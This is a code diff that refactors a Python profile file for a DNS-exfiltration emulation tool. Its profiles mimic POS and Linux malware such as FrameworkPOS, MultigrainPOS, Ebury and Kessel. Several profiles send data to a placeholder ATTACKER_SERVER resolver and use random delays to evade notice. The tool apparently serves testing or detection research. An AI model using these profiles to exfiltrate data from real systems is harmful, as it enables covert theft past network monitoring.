@@ -1,36 +1,48 @@
 import asyncio
-from cryptography.hazmat.primitives.serialization import load_pem_public_key
+
 from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicKey
+from cryptography.hazmat.primitives.serialization import load_pem_public_key
 
-import tdns.exfil
+from tdns.frameworkpos import frameworkpos
+from tdns.multigrainpos import multigrainpos
+from tdns.ebury import ebury
+from tdns.kessel import kessel
+from tdns.fastervec import fastervec
+from tdns.stealthyvec import stealthyvec
 
-ATTACKER_SERVER = '' # fill with the attacker's DNS server's IP
+ATTACKER_SERVER = ''  # fill with the attacker's DNS server's IP
 
 NUMBERS_MEANING = """
 Profile numbers:
-    0: Minute-long exfiltration, set period to 1 second*, to test functionality of the implementation.
+    0: Minute-long exfiltration, set period to 1 second*,
+       to test functionality of the implementation.
     1: Hour-long exfiltration, with random delays. Around 2 seconds period*.
-    2: 3-hours-long exfiltration, with random delays. Around 60 seconds period*.
+    2: 3-hours-long exfiltration, with random delays.
+       Around 60 seconds period*.
 
-    *: Some vectors use additional messages, their behaviour is not included in these periods.
+    *: Some vectors use additional messages,
+       their behaviour is not included in these periods.
        Note that in some vectors, 1 message does not include complete data.
 """
 
 # FrameworkPOS profiles ----------------------------------------------
 
+
 def frameworkpos_0():
-    return tdns.exfil.frameworkpos(
+    return frameworkpos(
         beacon_delay=10, proc_nums=1, amount=60, time=1)
 
 
 def frameworkpos_1():
-    return tdns.exfil.frameworkpos(
-        beacon_delay=60, proc_nums=3, time=3600, amount=1800, random_delay=True)
+    return frameworkpos(
+        beacon_delay=60, proc_nums=3,
+        time=3600, amount=1800, random_delay=True)
 
 
 def frameworkpos_2():
-    return tdns.exfil.frameworkpos(
-        beacon_delay=60, proc_nums=3, time=3600, amount=60, random_delay=True)
+    return frameworkpos(
+        beacon_delay=60, proc_nums=3,
+        time=3600, amount=60, random_delay=True)
 
 
 # MultigrainPOS profiles ---------------------------------------------
@@ -38,77 +50,89 @@ def frameworkpos_2():
 
 def multigrainpos_0():
     public_key: RSAPublicKey
-    with open('client/tdns/public.pem', 'rb') as keyfile:
+    with open('target/tdns/public.pem', 'rb') as keyfile:
         public_key = load_pem_public_key(
             keyfile.read()
         )
-    return tdns.exfil.multigrainpos(public_key, init_delay=10, amount=60, time=1)
+    return multigrainpos(
+        public_key, init_delay=10, amount=60, time=1)
 
 
 def multigrainpos_1():
     public_key: RSAPublicKey
-    with open('client/tdns/public.pem', 'rb') as keyfile:
+    with open('target/tdns/public.pem', 'rb') as keyfile:
         public_key = load_pem_public_key(
             keyfile.read()
         )
-    return tdns.exfil.multigrainpos(public_key, init_delay=60, amount=1800, time=3600, random_delay=True)
+    return multigrainpos(
+        public_key, init_delay=60,
+        amount=1800, time=3600, random_delay=True)
 
 
 def multigrainpos_2():
     public_key: RSAPublicKey
-    with open('client/tdns/public.pem', 'rb') as keyfile:
+    with open('target/tdns/public.pem', 'rb') as keyfile:
         public_key = load_pem_public_key(
             keyfile.read()
         )
-    return tdns.exfil.multigrainpos(public_key, init_delay=60, amount=60, time=3600, random_delay=True)
+    return multigrainpos(
+        public_key, init_delay=60,
+        amount=60, time=3600, random_delay=True)
 
 
 # Ebury profiles -----------------------------------------------------
 
 
 def ebury_0():
-    return tdns.exfil.ebury(resolver_addr=ATTACKER_SERVER,
-                           amount=60, time=1)
+    return ebury(
+        resolver_addr=ATTACKER_SERVER, amount=60, time=1)
 
 
 def ebury_1():
-    return tdns.exfil.ebury(resolver_addr=ATTACKER_SERVER,
-                           amount=1800, time=3600, random_delay=True)
+    return ebury(
+        resolver_addr=ATTACKER_SERVER,
+        amount=1800, time=3600, random_delay=True)
 
 
 def ebury_2():
-    return tdns.exfil.ebury(resolver_addr=ATTACKER_SERVER,
-                           amount=60, time=3600, random_delay=True)
+    return ebury(
+        resolver_addr=ATTACKER_SERVER,
+        amount=60, time=3600, random_delay=True)
 
 
 # FasterVec profiles -------------------------------------------------
 
 
 def fastervec_0():
-    return tdns.exfil.fastervec(udp=True, amount=60, time=1, resolver_addr=ATTACKER_SERVER)
+    return fastervec(
+        udp=True, amount=60, time=1, resolver_addr=ATTACKER_SERVER)
 
 
 def fastervec_1():
-    return tdns.exfil.fastervec(udp=True, amount=1800, time=3600, subdomain=20, resolver_addr=ATTACKER_SERVER, random_delay=True)
+    return fastervec(
+        udp=True, amount=1800, time=3600, subdomain=20,
+        resolver_addr=ATTACKER_SERVER, random_delay=True)
 
 
 def fastervec_2():
-    return tdns.exfil.fastervec(udp=True, amount=60, time=3600, subdomain=20, resolver_addr=ATTACKER_SERVER, random_delay=True)
+    return fastervec(
+        udp=True, amount=60, time=3600, subdomain=20,
+        resolver_addr=ATTACKER_SERVER, random_delay=True)
 
 
 # Kessel profiles ----------------------------------------------------
 
 
 def kessel_0():
-    return tdns.exfil.kessel(amount=60, time=1)
+    return kessel(amount=60, time=1)
 
 
 def kessel_1():
-    return tdns.exfil.kessel(amount=1800, time=3600, random_delay=True)
+    return kessel(amount=1800, time=3600, random_delay=True)
 
 
 def kessel_2():
-    return tdns.exfil.kessel(amount=60, time=3600, random_delay=True)
+    return kessel(amount=60, time=3600, random_delay=True)
 
 
 # StealthyVec profiles -----------------------------------------------
@@ -119,7 +143,8 @@ def stealthyvec_0():
         domains_list = dom_file.read().splitlines()
     with open('wordlists/words.txt', 'r') as words_file:
         words_list = words_file.read().splitlines()
-    return tdns.exfil.stealthyvec(domains=domains_list, words=words_list, levels=3, amount=60, time=1)
+    return stealthyvec(
+        domains=domains_list, words=words_list, levels=3, amount=60, time=1)
 
 
 def stealthyvec_1():
@@ -127,7 +152,9 @@ def stealthyvec_1():
         domains_list = dom_file.read().splitlines()
     with open('wordlists/words.txt', 'r') as words_file:
         words_list = words_file.read().splitlines()
-    return tdns.exfil.stealthyvec(domains=domains_list, words=words_list, levels=3, amount=1800, time=3600, random_delay=True)
+    return stealthyvec(
+        domains=domains_list, words=words_list,
+        levels=3, amount=1800, time=3600, random_delay=True)
 
 
 def stealthyvec_2():
@@ -135,7 +162,9 @@ def stealthyvec_2():
         domains_list = dom_file.read().splitlines()
     with open('wordlists/words.txt', 'r') as words_file:
         words_list = words_file.read().splitlines()
-    return tdns.exfil.stealthyvec(domains=domains_list, words=words_list, levels=3, amount=60, time=3600, random_delay=True)
+    return stealthyvec(
+        domains=domains_list, words=words_list,
+        levels=3, amount=60, time=3600, random_delay=True)
 
 
 # Custom profiles ----------------------------------------------------
